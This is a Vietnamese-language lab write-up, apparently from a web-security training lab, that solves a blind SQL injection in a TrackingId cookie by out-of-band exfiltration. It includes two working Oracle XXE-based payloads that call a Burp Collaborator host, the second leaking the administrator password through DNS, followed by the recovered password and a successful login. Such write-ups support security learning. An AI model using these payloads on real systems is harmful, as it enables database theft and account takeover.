![[Pasted image 20260623231720.png]]
# Tổng quan
Lab có lỗ hổng SQLi.Lab sử dụng tracking cookie để truy vấn SQL

Truy vấn SQL được chạy bất đồng bộ (asynchronous).

Điều này có nghĩa là:
- Server nhận request.
- Trả response ngay cho người dùng.
- Truy vấn SQL được xử lý ở một tiến trình khác sau đó.

Ta có thể sử dụng kỹ thuật `out-of-band data exfiltration`
# Khai Thác
Dựa vào description của lab,ta biết lỗ hổng SQLi nằm ở TrackingId
Ta sử dụng payload:
```SQL
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://xwx4dc4aadra6mvulnvjhsmch3nubkz9.oastify.com/"> %remote;]>'),'/l') FROM dual--
```
![[Pasted image 20260624100057.png]]
Thì ta có thể thấy là server đã tra cứu DNS:
![[Pasted image 20260624100037.png]]
=> dbms là Oracle
-Tiếp theo ta sử dụng payload để tiến hành lấy password của administrator:
```SQL
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.cl1j2rtpzsgpv1k9a2ky67br6ic900op.oastify.com/"> %remote;]>'),'/l') FROM dual--
```
Lúc này password nó sẽ hiện ở phía trước url của `Burp Collaborator Subdomain`:
![[Pasted image 20260624100856.png]]
Ta tra cứu phần HTTP và ta có thể thấy một chuỗi phía trước subdomain có thể đó là password của administrator.Ta tiến hành thử đăng nhập tài khoản `administrator` với mật khẩu là: `actuq779l5q02vkgwclr`:
![[Pasted image 20260624101053.png]]
Vậy ta đăng nhập thành công
=>solved!